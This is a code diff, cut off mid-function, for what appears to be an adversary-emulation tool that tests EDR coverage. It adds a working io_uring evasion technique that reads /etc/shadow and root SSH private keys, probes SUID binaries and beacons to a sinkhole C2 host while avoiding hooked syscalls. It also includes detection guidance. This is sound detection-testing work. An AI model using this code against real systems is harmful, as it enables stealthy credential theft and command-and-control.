@@ -867,7 +867,7 @@ impl AttackTechnique for ClearBashHistory {
 
             for history_path in &history_files {
                 if !Path::new(history_path).exists() {
-                    writeln!(log_file, "⊘ Skipping {history_path} (does not exist)")
+                    writeln!(log_file, "[SKIP] Skipping {history_path} (does not exist)")
                         .map_err(|e| format!("Failed to write: {e}"))?;
                     continue;
                 }
@@ -1458,6 +1458,12 @@ pub struct MasqueradingAsCrond {}
 
 #[async_trait]
 impl AttackTechnique for MasqueradingAsCrond {
+    // Compiles renamed C binaries to masquerade as crond; gcc is the core
+    // mechanism and the technique hard-fails (return Err) without it.
+    fn required_tools(&self) -> Vec<&'static str> {
+        vec!["gcc"]
+    }
+
     fn info(&self) -> Technique {
         Technique {
             id: "T1036.003".to_string(),
@@ -2885,7 +2891,7 @@ impl AttackTechnique for DisableSecurityTools {
                           XDR, Wazuh, ClamAV, osquery, Sysdig, Falco, and \
                           others).  Currently MUTED -- execute() short-circuits \
                           with a banner and does not perform any kills.  See \
-                          PRIVATE_DOCS/KNOWN_BUGS.md for context: the technique \
+                          KNOWN_BUGS.md for context: the technique \
                           works too well in chain mode (ALL_CAPS / \
                           defense_evasion) -- after the EDR is killed, every \
                           subsequent technique in the chain produces no \
@@ -2944,7 +2950,7 @@ impl AttackTechnique for DisableSecurityTools {
             // #[allow(unreachable_code)] attribute on the function, and
             // move the KNOWN_BUGS.md entry from Active to Resolved.
             //
-            // Full context: PRIVATE_DOCS/KNOWN_BUGS.md
+            // Full context: KNOWN_BUGS.md
             // ============================================================
             println!(
                 "\n\
@@ -2956,14 +2962,14 @@ impl AttackTechnique for DisableSecurityTools {
             );
             info!(
                 "[T1562.001] MUTED at execute() entry -- see \
-                 PRIVATE_DOCS/KNOWN_BUGS.md"
+                 KNOWN_BUGS.md"
             );
             return Ok(SimulationResult {
                 technique_id: "T1562.001".to_string(),
                 success: true,
                 message: "T1562.001 DisableSecurityTools is muted (IN DESIGN). \
                           No processes were touched.  See \
-                          PRIVATE_DOCS/KNOWN_BUGS.md for context."
+                          KNOWN_BUGS.md for context."
                     .to_string(),
                 artifacts: vec![],
                 cleanup_required: false,
@@ -3204,6 +3210,12 @@ pub struct ReflectiveCodeLoading {}
 
 #[async_trait]
 impl AttackTechnique for ReflectiveCodeLoading {
+    // Compiles a loader.c then memfd_create+fexecve's it; gcc compile failure or
+    // absence returns Err (no fallback), so skip cleanly when gcc is missing.
+    fn required_tools(&self) -> Vec<&'static str> {
+        vec!["gcc"]
+    }
+
     fn info(&self) -> Technique {
         Technique {
             id: "T1620".to_string(),
@@ -3465,6 +3477,802 @@ int main(int argc, char **argv, char **envp) {{
             }
 
             info!("[T1620] Cleanup complete");
+            Ok(())
+        })
+    }
+}
+
+// =============================================================================
+// T1106-IOURING: io_uring Syscall-less Recon & C2 (RingReaper pattern)
+// =============================================================================
+// Performs real post-exploitation I/O -- local-system data reads, host recon,
+// and a C2 connect+beacon -- entirely through io_uring submission/completion
+// rings.  The classic syscalls an EDR hooks (openat, read, connect, recvfrom,
+// statx) never fire, so a purely syscall-hooking sensor is blind to all of it.
+// Recreates the technique popularised by the RingReaper agent (Aug 2025).
+//
+// Every host operation is read-only; the single network egress targets the
+// SignalBench sinkhole.  Nothing is persisted -- fully reversible.
+
+/// Common SUID binaries probed (read-only, via io_uring Statx) for the setuid
+/// bit -- the privesc-recon step of the RingReaper pattern.
+const T1106_SUID_CANDIDATES: &[&str] = &[
+    "/usr/bin/sudo",
+    "/usr/bin/passwd",
+    "/usr/bin/mount",
+    "/usr/bin/umount",
+    "/usr/bin/su",
+    "/usr/bin/chsh",
+    "/usr/bin/chfn",
+    "/usr/bin/newgrp",
+    "/usr/bin/pkexec",
+    "/bin/ping",
+];
+
+/// One-line C2 beacon sent to the sinkhole over io_uring (IORING_OP_SEND).
+/// Shaped as a minimal HTTP/1.0 request so the sinkhole's HTTP handler logs it,
+/// giving server-side confirmation that the io_uring connect/send completed.
+const T1106_BEACON: &[u8] = b"GET /t1106-iouring HTTP/1.0\r\nHost: signalbench-iouring.sigre.xyz\r\nUser-Agent: signalbench-ringreaper/1.0\r\n\r\n";
+
+/// Second-channel beacon sent via IORING_OP_WRITE on the same sinkhole socket.
+/// Distinct path so the sinkhole log can distinguish Send vs Write opcodes --
+/// useful for verifying the EDR rule matches on the Write opcode, not only on
+/// Send/Recv (an early-gen io_uring detection gap).
+const T1106_BEACON_WRITE: &[u8] = b"GET /t1106-iouring-write HTTP/1.0\r\nHost: signalbench-iouring.sigre.xyz\r\nUser-Agent: signalbench-ringreaper/1.0 (write)\r\n\r\n";
+
+/// Benign read-only commands spawned in Pass B.  Their stdout is piped and read
+/// back through io_uring (IORING_OP_READ on the pipe fd) -- mirroring the
+/// published RingReaper behaviour of using the ring to exfiltrate child-process
+/// output even though the child itself is spawned with the conventional
+/// fork+execve syscall pair (the kernel has no IORING_OP_EXEC at present).
+const T1106_RECON_COMMANDS: &[(&str, &[&str])] = &[
+    ("/usr/bin/whoami", &[]),
+    ("/usr/bin/id", &[]),
+    ("/bin/hostname", &[]),
+    ("/bin/uname", &["-a"]),
+];
+
+// statx ABI constants, hard-coded because libc does not export `statx`,
+// STATX_MODE, or AT_STATX_SYNC_AS_STAT on all targets (notably musl).  These
+// are stable Linux UAPI values.  `struct statx` is a fixed 256-byte structure
+// whose stx_mode field is a u16 at byte offset 28.
+const T1106_STATX_BUF_LEN: usize = 256;
+const T1106_STATX_MODE_OFFSET: usize = 28;
+const T1106_STATX_MASK_MODE: u32 = 0x0000_0002; // STATX_MODE
+const T1106_AT_STATX_SYNC_AS_STAT: i32 = 0x0000; // AT_STATX_SYNC_AS_STAT
+const T1106_S_ISUID: u32 = 0o4000; // setuid bit
+
+/// Build an io_uring ring, preferring SQPOLL mode so the kernel polls the
+/// submission queue on a dedicated thread (`iou-sqp-<pid>`) and eliminates
+/// per-op `io_uring_enter` syscalls entirely.  Falls back to the standard
+/// (non-polling) ring on any setup error -- typically `EPERM` on kernels
+/// < 5.13 without `CAP_SYS_NICE`.  Returns the established ring together with
+/// a static label of the mode that was actually selected, for reporting back
+/// to the operator.
+///
+/// We deliberately do NOT hide the SQPOLL kernel thread: its visibility in
+/// `ps`/`top` is part of the coverage signal the defender is meant to see.
+fn t1106_build_ring(entries: u32) -> Result<(io_uring::IoUring, &'static str), std::io::Error> {
+    // SQPOLL idle interval: 2s.  Long enough that the poll thread does not
+    // churn CPU between recon steps, short enough that it stays warm across
+    // the technique's short lifetime.
+    match io_uring::IoUring::builder().setup_sqpoll(2000).build(entries) {
+        Ok(r) => Ok((r, "sqpoll")),
+        Err(_) => io_uring::IoUring::new(entries).map(|r| (r, "standard")),
+    }
+}
+
+/// Submit a chain of SQEs in a SINGLE `io_uring_enter` and return their raw
+/// CQE results in submission order.  All but the final entry are linked with
+/// `IOSQE_IO_LINK` so the kernel runs them as an ordered chain and aborts any
+/// successor of a failed link (`ECANCELED`) -- which is exactly what we want
+/// for sequences whose later steps make no sense if the earlier one failed
+/// (e.g. C2 `Connect → Send → Recv`).
+fn t1106_ring_submit_chain(
+    ring: &mut io_uring::IoUring,
+    entries: &[io_uring::squeue::Entry],
+    label: &str,
+) -> Result<Vec<i32>, String> {
+    if entries.is_empty() {
+        return Ok(Vec::new());
+    }
+    let n = entries.len();
+    // SAFETY: as in `t1106_ring_submit`, every buffer / CString / sockaddr
+    // referenced by an entry is kept alive by the caller across the
+    // synchronous submit_and_wait below.
+    {
+        let mut sq = ring.submission();
+        for (i, e) in entries.iter().enumerate() {
+            // Link all but the last so the kernel processes them in order
+            // and short-circuits successors of a failed link.
+            let entry = if i + 1 < n {
+                e.clone().flags(io_uring::squeue::Flags::IO_LINK)
+            } else {
+                e.clone()
+            };
+            unsafe {
+                sq.push(&entry).map_err(|_| {
+                    format!("{label}: submission queue full at link {i}")
+                })?;
+            }
+        }
+    }
+    ring.submit_and_wait(n)
+        .map_err(|e| format!("{label}: submit_and_wait({n}) failed: {e}"))?;
+    let mut out = Vec::with_capacity(n);
+    for cqe in ring.completion() {
+        out.push(cqe.result());
+    }
+    Ok(out)
+}
+
+/// Pushes one prepared SQE, submits, waits for its single completion, and
+/// returns the raw CQE result (>= 0 on success, negative -errno on failure).
+fn t1106_ring_submit(
+    ring: &mut io_uring::IoUring,
+    entry: &io_uring::squeue::Entry,
+    label: &str,
+) -> Result<i32, String> {
+    // SAFETY: every buffer / CString / sockaddr referenced by `entry` is kept
+    // alive by the caller until this function returns.  We submit_and_wait
+    // synchronously below, so the kernel is finished with the referenced memory
+    // before the caller's backing storage can drop.
+    unsafe {
+        ring.submission()
+            .push(entry)
+            .map_err(|_| format!("{label}: submission queue full"))?;
+    }
+    ring.submit_and_wait(1)
+        .map_err(|e| format!("{label}: submit_and_wait failed: {e}"))?;
+    let cqe = ring
+        .completion()
+        .next()
+        .ok_or_else(|| format!("{label}: no completion entry returned"))?;
+    Ok(cqe.result())
+}
+
+/// Spawns `cmd` with the given `args` and reads its stdout back through the
+/// io_uring ring (IORING_OP_READ on the child's pipe fd).  The spawn itself
+/// still uses the conventional `fork+execve` syscalls -- the kernel exposes
+/// no IORING_OP_EXEC -- but every byte of the command's output crosses the
+/// io_uring channel rather than a `read(2)` syscall, matching the published
+/// RingReaper behaviour of using the ring to exfiltrate child-process output.
+///
+/// Returns (first stdout line, total bytes read) on success.  The child is
+/// always reaped before returning so no zombies are left.
+fn t1106_iouring_read_command_output(
+    ring: &mut io_uring::IoUring,
+    cmd: &str,
+    args: &[&str],
+    ud: u64,
+    buf: &mut [u8],
+) -> Result<(String, usize), String> {
+    use io_uring::{opcode, types};
+    use std::os::unix::io::AsRawFd;
+    use std::process::{Command, Stdio};
+
+    let mut child = Command::new(cmd)
+        .args(args)
+        .stdin(Stdio::null())
+        .stdout(Stdio::piped())
+        .stderr(Stdio::null())
+        .spawn()
+        .map_err(|e| format!("{cmd}: spawn failed: {e}"))?;
+
+    let stdout = child
+        .stdout
+        .as_mut()
+        .ok_or_else(|| format!("{cmd}: stdout pipe unavailable"))?;
+    let fd = stdout.as_raw_fd();
+
+    let read = opcode::Read::new(types::Fd(fd), buf.as_mut_ptr(), buf.len() as u32)
+        .build()
+        .user_data(ud);
+    let n = t1106_ring_submit(ring, &read, &format!("ring-read {cmd} stdout"))?;
+
+    // Reap the child regardless of read outcome.  Best-effort: if wait fails
+    // we still return what we read (the kernel will reap on process exit).
+    let _ = child.wait();
+
+    if n < 0 {
+        return Err(format!("{cmd}: ring read failed (errno {})", -n));
+    }
+    let bytes = n as usize;
+    let first_line = buf[..bytes.min(buf.len())]
+        .split(|b| *b == b'\n')
+        .next()
+        .map(|line| String::from_utf8_lossy(line).trim().to_string())
+        .unwrap_or_default();
+    Ok((first_line, bytes))
+}
+
+/// Reads up to `buf.len()` bytes of `path` purely via io_uring (OpenAt + Read +
+/// Close).  Returns the number of bytes read into `buf`, or an error string.
+fn t1106_iouring_read_file(
+    ring: &mut io_uring::IoUring,
+    path: &str,
+    ud_base: u64,
+    buf: &mut [u8],
+) -> Result<usize, String> {
+    use io_uring::{opcode, types};
+    use std::ffi::CString;
+
+    let cpath = CString::new(path).map_err(|e| format!("{path}: bad path: {e}"))?;
+    let openat = opcode::OpenAt::new(types::Fd(libc::AT_FDCWD), cpath.as_ptr())
+        .flags(libc::O_RDONLY)
+        .build()
+        .user_data(ud_base);
+    let fd = t1106_ring_submit(ring, &openat, &format!("openat {path}"))?;
+    if fd < 0 {
+        return Err(format!("openat {path} failed (errno {})", -fd));
+    }
+
+    let read = opcode::Read::new(types::Fd(fd), buf.as_mut_ptr(), buf.len() as u32)
+        .build()
+        .user_data(ud_base + 1);
+    let read_res = t1106_ring_submit(ring, &read, &format!("read {path}"));
+
+    // Always close the fd, even if the read failed.
+    let close = opcode::Close::new(types::Fd(fd))
+        .build()
+        .user_data(ud_base + 2);
+    let _ = t1106_ring_submit(ring, &close, &format!("close {path}"));
+
+    let n = read_res?;
+    if n < 0 {
+        return Err(format!("read {path} failed (errno {})", -n));
+    }
+    Ok(n as usize)
+}
+
+pub struct IoUringEvasion {}
+
+#[async_trait]
+impl AttackTechnique for IoUringEvasion {
+    fn info(&self) -> Technique {
+        Technique {
+            id: "T1106-IOURING".to_string(),
+            name: "io_uring Syscall-less Recon & C2 (RingReaper)".to_string(),
+            description: "Recreates the io_uring EDR-evasion technique popularised \
+                          by the RingReaper post-exploitation agent (Aug 2025).  \
+                          Drives real post-exploitation I/O ENTIRELY through \
+                          io_uring submission/completion rings -- reading sensitive \
+                          files (/etc/passwd T1005; /etc/shadow + /root/.ssh/id_* \
+                          when root T1003.008/T1552.004); enumerating connections \
+                          (/proc/net/tcp T1049) and logged-in users (utmp T1033); \
+                          statx-probing common SUID binaries for privesc recon; \
+                          a chained Connect->Send->Recv C2 exchange plus a separate \
+                          IORING_OP_WRITE second-channel beacon to the SignalBench \
+                          sinkhole (T1106 Native API); and reading the stdout of \
+                          benign recon commands (whoami/id/hostname/uname -a) back \
+                          through the ring (IORING_OP_READ on the pipe fd).  \
+                          Prefers SQPOLL ring mode so the kernel polls the SQ on a \
+                          dedicated thread (iou-sqp-<pid>) and userspace makes ZERO \
+                          io_uring_enter syscalls for in-flight ops -- falls back \
+                          to standard mode if SQPOLL setup is refused (CAP_SYS_NICE \
+                          missing on kernels < 5.13).  Because the work is driven \
+                          by the ring rather than openat/read/connect/recvfrom/ \
+                          statx/write syscalls, a sensor that only hooks syscalls \
+                          sees NONE of it.  This is the current (2025) Linux EDR \
+                          blind spot, so the technique doubles as a coverage test: \
+                          it tells the operator whether their XDR/EDR observes \
+                          io_uring at all.  Every host operation is read-only; the \
+                          only egress targets the sinkhole; fully reversible -- \
+                          cleanup removes the one /tmp session log.  Requires a \
+                          kernel >= 5.6 with io_uring enabled (>= 5.13 for \
+                          unprivileged SQPOLL)."
+                .to_string(),
+            category: "defense_evasion".to_string(),
+            parameters: vec![TechniqueParameter {
+                name: "target_file".to_string(),
+                description: "Sensitive file read via io_uring OpenAt+Read (Data \
+                              from Local System).  Read-only.  Default: /etc/passwd"
+                    .to_string(),
+                required: false,
+                default: Some("/etc/passwd".to_string()),
+            }],
+            detection: "The detection signal is the io_uring channel itself, not a \
+                        payload.  Monitor for: io_uring_setup() at process start \
+                        (the SQPOLL ring spawns a kernel thread visible as \
+                        'iou-sqp-<pid>' in ps/top -- a strong IoC by itself); \
+                        io_uring_enter() syscalls (zero under SQPOLL, expect a \
+                        small bounded count under standard mode); processes \
+                        holding anonymous [io_uring] inode fds in /proc/[pid]/fd; \
+                        a conspicuous ABSENCE of openat/read/connect/recvfrom/ \
+                        statx/write syscalls for activity that demonstrably \
+                        touched files and the network (the tell-tale gap); \
+                        coverage of the IORING_OP_WRITE opcode in addition to \
+                        Send/Recv (an early-gen rule gap exercised by the \
+                        second-channel beacon); eBPF/KRSI-LSM, Falco and Tetragon \
+                        io_uring rules.  IMPORTANT: classic syscall hooking and \
+                        seccomp-syscall auditing will NOT see this technique -- if \
+                        your sensor raises nothing, that is the coverage gap being \
+                        measured.  Hardened hosts can neutralise it entirely via \
+                        sysctl kernel.io_uring_disabled=2."
+                .to_string(),
+            cleanup_support: true,
+            platforms: vec!["Linux".to_string()],
+            permissions: vec![],
+            voltron_only: false,
+        }
+    }
+
+    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
+        Box::pin(async move {
+            use io_uring::{opcode, types};
+            use std::ffi::CString;
+
+            let default_target = "/etc/passwd".to_string();
+            let target_file = config
+                .parameters
+                .get("target_file")
+                .unwrap_or(&default_target)
+                .clone();
+
+            let session_id = Uuid::new_v4().to_string().replace('-', "");
+            let work_dir = format!("/tmp/signalbench_t1106_{session_id}");
+            let log_path = format!("{work_dir}/run.log");
+
+            if dry_run {
+                info!(
+                    "[DRY RUN] T1106-IOURING would, ENTIRELY via io_uring SQEs (no openat/read/connect/recv/statx/write syscalls):"
+                );
+                info!("[DRY RUN]   0. Build ring preferring SQPOLL (kernel poll thread iou-sqp-<pid>); fall back to standard");
+                info!("[DRY RUN]   1. OpenAt+Read+Close {target_file} (Data from Local System / T1005)");
+                info!("[DRY RUN]   2. OpenAt+Read /proc/net/tcp (Network Connections Discovery / T1049)");
+                info!("[DRY RUN]   3. OpenAt+Read utmp (System Owner/User Discovery / T1033)");
+                info!("[DRY RUN]   3b. Root only: OpenAt+Read /etc/shadow (T1003.008) + first /root/.ssh/id_* (T1552.004)");
+                info!(
+                    "[DRY RUN]   4. Statx over {} common SUID binaries (privesc recon)",
+                    T1106_SUID_CANDIDATES.len()
+                );
+                info!(
+                    "[DRY RUN]   4b. Spawn {} read-only commands (whoami/id/hostname/uname -a) and read their stdout back through the ring (IORING_OP_READ on the pipe fd)",
+                    T1106_RECON_COMMANDS.len()
+                );
+                info!("[DRY RUN]   5. Chained Connect->Send->Recv to the sinkhole + OP_WRITE second-channel beacon (C2 over io_uring / T1106 Native API)");
+                info!("[DRY RUN]   cleanup removes {work_dir}");
+                return Ok(SimulationResult {
+                    technique_id: self.info().id,
+                    success: true,
+                    message: format!(
+                        "DRY RUN: would perform syscall-less io_uring recon ({target_file}, /proc/net/tcp, utmp, SUID statx; root-only /etc/shadow + SSH key) plus a chained C2 connect/send/recv + OP_WRITE second-channel to the sinkhole; ring mode prefers SQPOLL"
+                    ),
+                    artifacts: vec![],
+                    cleanup_required: false,
+                });
+            }
+
+            info!(
+                "Starting T1106-IOURING -- io_uring syscall-less recon & C2 (session {session_id})"
+            );
+
+            // io_uring availability pre-check.  ENOSYS = kernel too old (< 5.6);
+            // EPERM = kernel.io_uring_disabled sysctl set.  Either way we report
+            // a clean, non-crashing result -- an unavailable io_uring is itself a
+            // positive hardening signal for the operator.
+            //
+            // SQPOLL is preferred (no per-op io_uring_enter syscall); the helper
+            // transparently falls back to standard mode if SQPOLL setup is
+            // refused (e.g. CAP_SYS_NICE missing on kernels < 5.13).
+            let (mut ring, ring_mode) = match t1106_build_ring(32) {
+                Ok(pair) => pair,
+                Err(e) => {
+                    let reason = match e.raw_os_error() {
+                        Some(libc::ENOSYS) => {
+                            "io_uring not supported by this kernel (requires >= 5.6)"
+                        }
+                        Some(libc::EPERM) => {
+                            "io_uring disabled by kernel.io_uring_disabled sysctl"
+                        }
+                        _ => "io_uring_setup failed",
+                    };
+                    let msg = format!(
+                        "T1106-IOURING: {reason} ({e}).  No syscall-less io_uring channel could be established on this host -- this is a positive hardening posture."
+                    );
+                    warn!("{msg}");
+                    return Ok(SimulationResult {
+                        technique_id: self.info().id,
+                        success: false,
+                        message: msg,
+                        artifacts: vec![],
+                        cleanup_required: false,
+                    });
+                }
+            };
+
+            let mut report: Vec<String> = Vec::new();
+            report.push(format!("SignalBench T1106-IOURING session {session_id}"));
+            report.push(format!(
+                "Ring mode: {ring_mode} (sqpoll = kernel polls SQ, zero io_uring_enter per op)"
+            ));
+            report.push(
+                "All recon + C2 I/O below performed via io_uring SQEs (no equivalent syscalls)."
+                    .to_string(),
+            );
+
+            let mut buf = vec![0u8; 16384];
+
+            // Step 1: Data from Local System (T1005) -- read target_file.
+            match t1106_iouring_read_file(&mut ring, &target_file, 0x10, &mut buf) {
+                Ok(n) => {
+                    let line = format!("[OK] T1005 io_uring read {target_file}: {n} bytes");
+                    info!("  [-->] {line}");
+                    report.push(line);
+                }
+                Err(e) => {
+                    let line = format!("[--] T1005 io_uring read {target_file}: {e}");
+                    warn!("  {line}");
+                    report.push(line);
+                }
+            }
+
+            // Step 2: System Network Connections Discovery (T1049) -- /proc/net/tcp.
+            match t1106_iouring_read_file(&mut ring, "/proc/net/tcp", 0x20, &mut buf) {
+                Ok(n) => {
+                    let entries = buf[..n.min(buf.len())]
+                        .iter()
+                        .filter(|&&b| b == b'\n')
+                        .count()
+                        .saturating_sub(1);
+                    let line = format!(
+                        "[OK] T1049 io_uring read /proc/net/tcp: {n} bytes (~{entries} tcp entries)"
+                    );
+                    info!("  [-->] {line}");
+                    report.push(line);
+                }
+                Err(e) => {
+                    let line = format!("[--] T1049 io_uring read /proc/net/tcp: {e}");
+                    warn!("  {line}");
+                    report.push(line);
+                }
+            }
+
+            // Step 3: System Owner/User Discovery (T1033) -- utmp (logged-in users).
+            let utmp = if Path::new("/run/utmp").exists() {
+                "/run/utmp"
+            } else {
+                "/var/run/utmp"
+            };
+            match t1106_iouring_read_file(&mut ring, utmp, 0x30, &mut buf) {
+                Ok(n) => {
+                    let line = format!("[OK] T1033 io_uring read {utmp}: {n} bytes");
+                    info!("  [-->] {line}");
+                    report.push(line);
+                }
+                Err(e) => {
+                    let line = format!("[--] T1033 io_uring read {utmp}: {e}");
+                    warn!("  {line}");
+                    report.push(line);
+                }
+            }
+
+            // Step 3b: Root-only sensitive reads -- /etc/shadow and the first
+            // SSH private key under /root/.ssh.  These are the canonical files
+            // RingReaper exfiltrates when it has the privileges; cleanly
+            // skipped (no signal degradation) for non-root users because the
+            // files are simply unreadable.  Existing read precedent in
+            // T1003.008 / T1552.001.
+            if crate::utils::is_root() {
+                match t1106_iouring_read_file(&mut ring, "/etc/shadow", 0x34, &mut buf) {
+                    Ok(n) => {
+                        let line = format!(
+                            "[OK] T1003.008 io_uring read /etc/shadow: {n} bytes (root-only)"
+                        );
+                        info!("  [-->] {line}");
+                        report.push(line);
+                    }
+                    Err(e) => {
+                        let line = format!("[--] T1003.008 io_uring read /etc/shadow: {e}");
+                        warn!("  {line}");
+                        report.push(line);
+                    }
+                }
+
+                // First id_* private key in /root/.ssh -- read whatever is there
+                // (id_rsa, id_ed25519, id_ecdsa).  Read-only, contents discarded
+                // after the byte count.
+                let ssh_key = std::fs::read_dir("/root/.ssh")
+                    .ok()
+                    .and_then(|rd| {
+                        rd.flatten()
+                            .map(|e| e.path())
+                            .find(|p| {
+                                p.file_name()
+                                    .and_then(|n| n.to_str())
+                                    .map(|n| n.starts_with("id_") && !n.ends_with(".pub"))
+                                    .unwrap_or(false)
+                            })
+                    });
+                if let Some(key_path) = ssh_key {
+                    let key_str = key_path.to_string_lossy().into_owned();
+                    match t1106_iouring_read_file(&mut ring, &key_str, 0x37, &mut buf) {
+                        Ok(n) => {
+                            let line = format!(
+                                "[OK] T1552.004 io_uring read {key_str}: {n} bytes (SSH private key)"
+                            );
+                            info!("  [-->] {line}");
+                            report.push(line);
+                        }
+                        Err(e) => {
+                            let line = format!("[--] T1552.004 io_uring read {key_str}: {e}");
+                            warn!("  {line}");
+                            report.push(line);
+                        }
+                    }
+                } else {
+                    report.push(
+                        "[--] T1552.004 io_uring read SSH private key: no id_* key under /root/.ssh"
+                            .to_string(),
+                    );
+                }
+            } else {
+                report.push(
+                    "[skip] root-only reads (/etc/shadow, /root/.ssh) -- not running as root"
+                        .to_string(),
+                );
+            }
+
+            // Step 4: SUID discovery -- Statx each candidate, flag the setuid bit.
+            let mut suid_hits: Vec<&str> = Vec::new();
+            for (i, cand) in T1106_SUID_CANDIDATES.iter().enumerate() {
+                let cpath = match CString::new(*cand) {
+                    Ok(c) => c,
+                    Err(_) => continue,
+                };
+                // The kernel fills a `struct statx` (a fixed 256-byte UAPI
+                // structure) into this buffer.  We use a raw byte buffer rather
+                // than libc::statx because libc does not expose `statx` /
+                // STATX_MODE / AT_STATX_SYNC_AS_STAT on all targets (notably
+                // musl); io_uring::types::statx is an opaque placeholder, so the
+                // pointer is just cast to it.  stx_mode is a u16 at offset 28.
+                let mut stx = [0u8; T1106_STATX_BUF_LEN];
+                let statx_e = opcode::Statx::new(
+                    types::Fd(libc::AT_FDCWD),
+                    cpath.as_ptr(),
+                    stx.as_mut_ptr().cast::<types::statx>(),
+                )
+                .flags(T1106_AT_STATX_SYNC_AS_STAT)
+                .mask(T1106_STATX_MASK_MODE)
+                .build()
+                .user_data(0x40 + i as u64);
+                let r = t1106_ring_submit(&mut ring, &statx_e, &format!("statx {cand}"));
+                let mode = u16::from_ne_bytes([
+                    stx[T1106_STATX_MODE_OFFSET],
+                    stx[T1106_STATX_MODE_OFFSET + 1],
+                ]);
+                if matches!(r, Ok(0)) && (u32::from(mode) & T1106_S_ISUID) != 0 {
+                    suid_hits.push(*cand);
+                }
+            }
+            let suid_line = if suid_hits.is_empty() {
+                "[OK] privesc io_uring statx: no setuid bit on probed candidates".to_string()
+            } else {
+                format!(
+                    "[OK] privesc io_uring statx: setuid binaries -> {}",
+                    suid_hits.join(", ")
+                )
+            };
+            info!("  [-->] {suid_line}");
+            report.push(suid_line);
+
+            // Step 4b: Recon command output via io_uring -- spawn benign
+            // read-only commands (whoami / id / hostname / uname -a) and read
+            // their stdout back through the ring (IORING_OP_READ on the pipe
+            // fd).  This matches the published RingReaper behaviour of using
+            // io_uring to exfiltrate child-process output; the spawn itself
+            // still uses fork+execve (kernel has no IORING_OP_EXEC).  All
+            // commands are read-only, bounded by their own brief execution,
+            // and the children are reaped before returning -- fully reversible.
+            for (i, (cmd, args)) in T1106_RECON_COMMANDS.iter().enumerate() {
+                let ud = 0x80 + i as u64;
+                match t1106_iouring_read_command_output(&mut ring, cmd, args, ud, &mut buf) {
+                    Ok((first_line, n)) => {
+                        let preview = if first_line.is_empty() {
+                            "<empty>".to_string()
+                        } else if first_line.len() > 60 {
+                            format!("{}...", &first_line[..57])
+                        } else {
+                            first_line
+                        };
+                        let line = format!(
+                            "[OK] recon-cmd io_uring read stdout of `{cmd}`: {n} bytes ({preview})"
+                        );
+                        info!("  [-->] {line}");
+                        report.push(line);
+                    }
+                    Err(e) => {
+                        let line = format!("[--] recon-cmd `{cmd}`: {e}");
+                        warn!("  {line}");
+                        report.push(line);
+                    }
+                }
+            }
+
+            // Step 5: C2 over io_uring -- Connect + Send + Recv to the sinkhole.
+            let sinkhole_ip = crate::techniques::resolve_sinkhole_ip().await;
+            let c2_line = match sinkhole_ip.parse::<std::net::Ipv4Addr>() {
+                Ok(ip) => {
+                    // The socket fd is created with the libc wrapper (a single
+                    // socket(2)); the meaningful, EDR-hooked operations --
+                    // connect, send, recv -- are all driven over io_uring below.
+                    let sockfd = unsafe { libc::socket(libc::AF_INET, libc::SOCK_STREAM, 0) };
+                    if sockfd < 0 {
+                        "[--] T1106 C2: socket() failed".to_string()
+                    } else {
+                        let mut addr: libc::sockaddr_in = unsafe { std::mem::zeroed() };
+                        addr.sin_family = libc::AF_INET as libc::sa_family_t;
+                        addr.sin_port = 80u16.to_be();
+                        addr.sin_addr = libc::in_addr {
+                            s_addr: u32::from_ne_bytes(ip.octets()),
+                        };
+
+                        // Build the C2 sequence as a single linked CHAIN
+                        // (IOSQE_IO_LINK) -- Connect → Send → Recv -- so the
+                        // whole exchange is one io_uring_enter under standard
+                        // mode and zero under SQPOLL.  This matches the
+                        // published RingReaper IoC profile.
+                        let connect_e = opcode::Connect::new(
+                            types::Fd(sockfd),
+                            &addr as *const libc::sockaddr_in as *const libc::sockaddr,
+                            std::mem::size_of::<libc::sockaddr_in>() as libc::socklen_t,
+                        )
+                        .build()
+                        .user_data(0x50);
+                        let send_e = opcode::Send::new(
+                            types::Fd(sockfd),
+                            T1106_BEACON.as_ptr(),
+                            T1106_BEACON.len() as u32,
+                        )
+                        .build()
+                        .user_data(0x51);
+                        let recv_e = opcode::Recv::new(
+                            types::Fd(sockfd),
+                            buf.as_mut_ptr(),
+                            buf.len() as u32,
+                        )
+                        .build()
+                        .user_data(0x52);
+
+                        let result = match t1106_ring_submit_chain(
+                            &mut ring,
+                            &[connect_e, send_e, recv_e],
+                            "C2 connect->send->recv chain",
+                        ) {
+                            Ok(results) if results.first().copied().unwrap_or(-1) >= 0 => {
+                                let sent = results.get(1).copied().unwrap_or(-1);
+                                let recvd = results.get(2).copied().unwrap_or(-1);
+                                format!(
+                                    "[OK] T1106 C2 over io_uring (chain): connect {sinkhole_ip}:80, sent {} bytes, recv {} bytes",
+                                    sent.max(0),
+                                    recvd.max(0)
+                                )
+                            }
+                            Ok(results) => format!(
+                                "[--] T1106 C2: chain connect to {sinkhole_ip}:80 failed (errno {})",
+                                -results.first().copied().unwrap_or(-1)
+                            ),
+                            Err(e) => format!("[--] T1106 C2: {e}"),
+                        };
+
+                        // Second-channel beacon via IORING_OP_WRITE on the same
+                        // socket fd -- exercises a different opcode so EDR rules
+                        // that only key on Send/Recv have a separate IoC to fail.
+                        let write_e = opcode::Write::new(
+                            types::Fd(sockfd),
+                            T1106_BEACON_WRITE.as_ptr(),
+                            T1106_BEACON_WRITE.len() as u32,
+                        )
+                        .build()
+                        .user_data(0x60);
+                        match t1106_ring_submit(&mut ring, &write_e, "C2 write second-channel") {
+                            Ok(n) if n >= 0 => {
+                                let line = format!(
+                                    "[OK] T1106 C2 OP_WRITE second-channel: {n} bytes to {sinkhole_ip}:80"
+                                );
+                                info!("  [-->] {line}");
+                                report.push(line);
+                            }
+                            Ok(n) => {
+                                let line = format!(
+                                    "[--] T1106 C2 OP_WRITE second-channel failed (errno {})",
+                                    -n
+                                );
+                                warn!("  {line}");
+                                report.push(line);
+                            }
+                            Err(e) => {
+                                let line = format!("[--] T1106 C2 OP_WRITE second-channel: {e}");
+                                warn!("  {line}");
+                                report.push(line);
+                            }
+                        }
+
+                        // Close the socket over io_uring; fall back to libc::close.
+                        let close_e = opcode::Close::new(types::Fd(sockfd))
+                            .build()
+                            .user_data(0x53);
+                        if t1106_ring_submit(&mut ring, &close_e, "close socket").is_err() {
+                            unsafe {
+                                libc::close(sockfd);
+                            }
+                        }
+                        result
+                    }
+                }
+                Err(_) => format!("[--] T1106 C2: could not parse sinkhole IP {sinkhole_ip}"),
+            };
+            info!("  [-->] {c2_line}");
+            report.push(c2_line);
+
+            // Persist a local audit log via normal I/O -- on purpose: we WANT
+            // this record visible.  Only the recon/C2 above is syscall-less.
